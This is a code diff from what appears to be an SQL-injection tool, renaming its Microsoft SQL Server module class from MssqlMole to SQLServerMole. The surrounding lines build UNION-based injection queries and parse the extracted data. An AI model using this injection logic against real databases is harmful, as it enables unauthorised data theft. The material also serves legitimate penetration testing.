@@ -25,7 +25,7 @@
 from dbmsmoles import DbmsMole, FingerBase
 import re
 
-class MssqlMole(DbmsMole):
+class SQLServerMole(DbmsMole):
     out_delimiter_result = "::-::"
     out_delimiter = DbmsMole.char_concat(out_delimiter_result)
     inner_delimiter_result = "><"
@@ -83,7 +83,7 @@ class MssqlMole(DbmsMole):
 
     @classmethod
     def blind_field_delimiter(cls):
-        return MssqlMole.inner_delimiter_result
+        return SQLServerMole.inner_delimiter_result
 
     @classmethod
     def dbms_check_blind_query(cls):
@@ -91,10 +91,10 @@ class MssqlMole(DbmsMole):
 
     @classmethod
     def dbms_name(cls):
-        return 'Mssql'
+        return 'SQL Server'
         
     def __str__(self):
-        return "Mssql Mole"
+        return "SQL Server Mole"
 
     @classmethod
     def injectable_field_fingers(cls, query_columns, base):
@@ -133,11 +133,11 @@ class MssqlMole(DbmsMole):
         query = " and 1 = 0 UNION ALL SELECT TOP 1 "
         query_list = list(self.query)
         if re.search('count\([\w*]+\)', fields):
-            query_list[injectable_field] = (MssqlMole.out_delimiter + '+cast(' + fields + ' as varchar(50))+' + MssqlMole.out_delimiter)
+            query_list[injectable_field] = (SQLServerMole.out_delimiter + '+cast(' + fields + ' as varchar(50))+' + SQLServerMole.out_delimiter)
             query += ','.join(query_list)
             return query + " from " + table_name + " where " + self.parse_condition(where)
         fields = self._concat_fields(fields.split(','))
-        query_list[injectable_field] = (MssqlMole.out_delimiter + "+" + fields + "+" + MssqlMole.out_delimiter)
+        query_list[injectable_field] = (SQLServerMole.out_delimiter + "+" + fields + "+" + SQLServerMole.out_delimiter)
         where = self.parse_condition(where)
         query += ','.join(query_list)
         query += (" from " + table_name + " where " + fields +  " not in (select top " + 
@@ -146,11 +146,11 @@ class MssqlMole(DbmsMole):
         return query
 
     def _concat_fields(self, fields):
-        return ('+' + MssqlMole.inner_delimiter + '+').join(map(lambda x: 'isnull(cast(' + x + ' as varchar(100)), char(32))' ,fields))
+        return ('+' + SQLServerMole.inner_delimiter + '+').join(map(lambda x: 'isnull(cast(' + x + ' as varchar(100)), char(32))' ,fields))
 
     def parse_results(self, url_data):
-        data_list = url_data.split(MssqlMole.out_delimiter_result)
+        data_list = url_data.split(SQLServerMole.out_delimiter_result)
         if len(data_list) < 3:
             return None
         data = data_list[1]
-        return data.split(MssqlMole.inner_delimiter_result)
+        return data.split(SQLServerMole.inner_delimiter_result)
